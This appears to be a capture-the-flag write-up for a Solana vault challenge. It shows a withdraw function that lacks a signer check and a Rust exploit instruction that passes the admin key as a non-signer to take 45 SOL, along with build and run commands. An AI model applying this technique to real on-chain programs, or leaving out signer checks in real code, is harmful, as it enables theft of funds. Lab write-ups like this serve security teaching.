# Vault Heist

**Category:** Blockchain  **Difficulty:** Medium  **Author:** Abu

> A vault program holds 50 SOL in a PDA. The vault has an admin who can withdraw funds. Players start with 5 SOL and must steal at least 40 SOL to capture the flag.

Handout: `plus-minus.tar.gz`. Run: `cd challenge && docker compose up --build`, port 5003.

## Solution

`AdminWithdraw` checks that the account you pass is the admin, but never checks that it signed:

```rust
if vault_data.admin != *admin_account.key {
    return Err(ProgramError::InvalidAccountData);
}
// no admin_account.is_signer check
```

The server prints the admin pubkey, so we just pass it as a plain non-signer account and send the money to ourselves:

```rust
let ix = Instruction {
    program_id: *vault_program.key,
    accounts: vec![
        AccountMeta::new(*vault_pda.key, false),
        AccountMeta::new(*admin_pubkey.key, false),   // not a signer
        AccountMeta::new(*user_account.key, false),
    ],
    data: VaultInstruction::AdminWithdraw { amount: 45_000_000_000 }.try_to_vec().unwrap(),
};
invoke(&ix, &[vault_pda.clone(), admin_pubkey.clone(), user_account.clone()])?;
```

```
cd solve && cargo build-sbf && cd ..
CHALLENGE_HOST=<host> CHALLENGE_PORT=5003 python3 solve.py
```

Flag: dynamic per container, `H7CTF{m1ss1ng_s1gn3r_ch3ck_1s_4_cl4ss1c_vuln_<uuid>}`
